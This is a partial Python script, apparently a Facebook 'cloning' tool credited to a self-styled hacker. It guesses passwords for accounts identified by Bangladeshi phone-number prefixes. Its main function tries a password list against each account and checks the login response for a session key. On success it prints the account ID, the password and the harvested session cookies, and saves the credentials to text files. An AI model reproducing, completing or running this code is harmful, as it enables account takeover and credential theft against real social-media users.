#WRITTEN BY ABIR
#FOLLOW : https://github.com/abirahamed121
#------------- import -------------#
import os
...
{warna}--------------------------------------------{B}
 Owner    : {C}ABIR{B}
 Guthub   : abirahamed121
 Facebook : https://www.facebook.com/ABIR.HACKER.50
 Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}ABIR{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
...
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/abirahamed121')
...
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019] [015]')
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[ABIR-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/ABIR-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[ABIR-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/ABIR-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
